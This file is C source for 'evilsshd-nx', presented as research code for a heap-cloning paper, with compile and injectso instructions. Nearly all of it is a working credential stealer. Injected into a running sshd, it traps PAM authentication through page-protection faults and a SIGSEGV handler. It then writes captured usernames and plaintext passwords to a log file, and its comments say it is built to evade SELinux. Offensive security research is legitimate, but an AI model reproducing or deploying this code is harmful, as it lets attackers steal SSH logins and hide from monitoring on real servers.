/*
 * Copyright (C) 2007-2012 Stealth.
 * All rights reserved.
 *
 * This is NOT a common BSD license, so read on.
 *
 * Redistribution in source and use in binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. The provided software is FOR EDUCATIONAL PURPOSES ONLY! You must not
 *    use this software or parts of it to commit crime or any illegal
 *    activities. Local law may forbid usage or redistribution of this
 *    software in your country.
 * 2. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 3. Redistribution in binary form is not allowed.
 * 4. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 5. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/* This is the SELinux-safe version of evilsshd.c. Since it does not
 * modify .text but only page protections, there is no way SELinux could
 * detect tampering of sshd. It'd probably also work to do some transition
 * to an "undefined_t" instead of doing the evil tricks as confined "sshd_t".
 * Yet, this is a research project so we could go a more complicated way
 * since it serves as an example to demonstrate self-debugging soley
 * based on page protections.
 * On Fedora 11, compile like
 *
 * # gcc -fPIC -shared -nostartfiles evilsshd-nx.c -DFEDORA11 -o /lib64/sshd.so
 * and then using injectso.
 *
 * This code is part of the 'Adventures in Heap Cloning' research paper.
 * If you find this code without the paper, search for
 * SET-heap-cloning-2009 on the web.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <security/pam_modules.h>
#include <link.h>
#include <ucontext.h>
#include <elf.h>
#include <sys/time.h>

// the functions which have been hooked
static unsigned char *hooks[0x10] = {0, 0};

static char *user = NULL;
static FILE *flog = NULL;

typedef enum { PAM_FALSE, PAM_TRUE } pam_boolean;

// all the PAM declarations must match EXACTLY the targets
// PAM version and structs. Otherwise, walking the pam
// handler lists etc. is likely to produce SIGSEGV
struct handler {
	int handler_type_must_fail;
	int (*func)(void *pamh, int flags, int argc, char **argv);
	int actions[32];
	/* set by authenticate, open_session, chauthtok(1st)
	 consumed by setcred, close_session, chauthtok(2nd) */
	int cached_retval; int *cached_retval_p;
	int argc;
	char **argv;
	struct handler *next;
	char *mod_name;
	int stack_level;
};

struct handlers {
	struct handler *authenticate;
	struct handler *setcred;
	struct handler *acct_mgmt;
	struct handler *open_session;
	struct handler *close_session;
	struct handler *chauthtok;
};

struct pam_handle {
	char *authtok;
	unsigned caller_is;
	void *pam_conversation;
	char *oldauthtok;
	char *prompt;
	char *service_name;
	char *user;
	char *rhost;
	char *ruser;
	char *tty;
	char *xdisplay;
#ifdef FEDORA11
	char *authok_type;
#endif
	void *data, *env;
	struct {
		pam_boolean set;
		unsigned int delay;
		time_t begin;
		void *delay_fn_ptr;
	} fail_delay;
	struct {
		int namelen;
		char *name;
		int datalen;
		char *data;
	} xauth;
	struct {
		void *loaded_module;
		int modules_allocated;
		int modules_used;
		int handlers_loaded;
		struct handlers conf;
		struct handlers other;
	} handlers;
};


void trapit(void *ptr, int idx)
{
	unsigned char *aligned = (unsigned char *)(((size_t)ptr) & ~4095);

	if (!ptr)
		return;
	// -1 indicates to only change back temporary +x
	if (idx >= 0)
		hooks[idx] = ptr;
	mprotect(aligned, 4096, PROT_READ);
}


void fixit(void *ptr)
{
	unsigned char *aligned = (unsigned char *)(((size_t)ptr) & ~4095);
	if (!ptr)
		return;
	mprotect(aligned, 4096, PROT_READ|PROT_EXEC);
}


void fixall()
{
	int i;
	for (i = 0; i < sizeof(hooks)/sizeof(hooks[0]); ++i)
		fixit(hooks[i]);
}


// lets hope its not mapped
static const greg_t magic_ip = 0x73507350;
static greg_t orig_ret, trap_ip;
static int done = 0;
pid_t parent_pid = 0;

static void sigtrap(int x, siginfo_t *si, void *vp)
{
	ucontext_t *uc = vp;
	void *arg = NULL;
	struct pam_handle *ph = NULL;
	struct handler *mod = NULL;
	pid_t pid = getpid();

	if (!parent_pid)
		parent_pid = pid;

#ifdef __x86_64__
	greg_t ip = uc->uc_mcontext.gregs[REG_RIP];
	arg = (void *)uc->uc_mcontext.gregs[REG_RDI];
#else
	// x86 is not implemented, I just show it to give an idea
	greg_t ip = uc->uc_mcontext.gregs[REG_EIP];
#endif
	fprintf(flog, "[%d] TRAP@ 0x%zx\n", pid, ip);

	// a trap due to modified "ret", correct it
	if (ip == magic_ip) {
		fprintf(flog, "[%d] corrected ret (0x%zx)\n", pid, orig_ret);
		uc->uc_mcontext.gregs[REG_RIP] = orig_ret;
		if (done) {
			fixall();
			return;
		}
		trapit((void *)trap_ip, -1);
		return;
	}

	if (done) {
		fixall();
		return;
	}

	// this is a finite state machine (FSM), we trap ourself forward
	// until we reach the final strdup() for the password
	// If the FSM is left, all hooks are cleaned up in target process
	// since the last state does not define new hooks
	if (ip == (greg_t)hooks[0]) {
		fixit(hooks[0]);
		ph = (struct pam_handle *)arg;
		mod = ph->handlers.conf.authenticate;
		do {
			fprintf(flog, "[%d] TRAP1: loaded PAM modules: %s\n", pid, mod->mod_name);
			if (strstr(mod->mod_name, "pam_unix"))
				break;
		} while ((mod = mod->next) != NULL);

		// hook pam authenticate function
		if (mod != NULL)
			trapit(mod->func, 1);
	} else if (ip == (greg_t)hooks[1]) {
		fixit(hooks[1]);

		ph = (struct pam_handle *)arg;
		fprintf(flog, "[%d] TRAP2: hooking strdup() user=%s\n", pid, ph->user);
		user = strdup(ph->user);
		// carefull to only hook after we used strdup() ourself
		trapit(dlsym(NULL, "strdup"), 2);
	} else if (ip == (greg_t)hooks[2]) {
		fixall();
		done = 1;
		fprintf(flog, "[%d] TRAP3: credentials: user=%s pwd=%s\n", pid, user, (char *)arg);
#ifndef FEDORA11
	// Since we dont modify pages, the protections are shared across childs.
	// Only child-sshd is the one which must trap strdup(). If a hook[1] is defined
	// and we are the parent and we are trapped at a function we dont
	// hook, it means we are all done.
	} else if (pid == parent_pid && hooks[1] != NULL) {
		fixall();
		done = 1;
		fprintf(flog, "[%d] parent trapped after in state 1. cleanup.\n", pid);
#endif
	// some other function inside a nx page was unintentionally trapped;
	// make page temorgary +x, and trap upon return of the function
	} else {
		fixit((void *)ip);
		fprintf(flog, "[%d] wrong hit at 0x%zx, redirecting...\n", pid, ip);
		orig_ret = *(greg_t *)uc->uc_mcontext.gregs[REG_RSP];
		trap_ip = ip;
		*(greg_t *)uc->uc_mcontext.gregs[REG_RSP] = magic_ip;
	}
	return;
}


void _init()
{
	struct sigaction sa;

	flog = fopen("/var/run/hooklog", "a");
	if (!flog)
		return;
	setbuffer(flog, NULL, 0);

	trapit(dlsym(NULL, "pam_set_item"), 0);

	memset(&sa, 0, sizeof(sa));
	sa.sa_sigaction = sigtrap;
	sa.sa_flags = SA_RESTART|SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);

	fprintf(flog, "initial hooking: pid=%d addr=%p ", getpid(), hooks[0]);
	fprintf(flog, "done\n");
	return;
}

